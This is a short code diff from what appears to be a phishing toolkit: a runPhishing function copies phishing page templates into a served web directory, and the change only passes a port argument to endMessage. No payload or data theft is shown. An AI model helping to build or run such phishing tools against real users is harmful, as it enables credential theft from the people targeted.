@@ -148,7 +148,7 @@ def runPhishing(page, customOption):  # Phishing pages selection menu
         sleep(3)
         copy_tree('WebPages/CUSTOM(2)/', "Server/www/")
     else:
-        endMessage()
+        endMessage(port)
 
 
 def selectPort():  # Question where user must select port
@@ -812,7 +812,7 @@ ________________________________________________________________________________
         customOption = ''
         runPhishing('CUSTOM(2)', customOption)
     else:
-        endMessage()
+        endMessage(port)
 
 
 def loadModule(module):  # This one just show text..
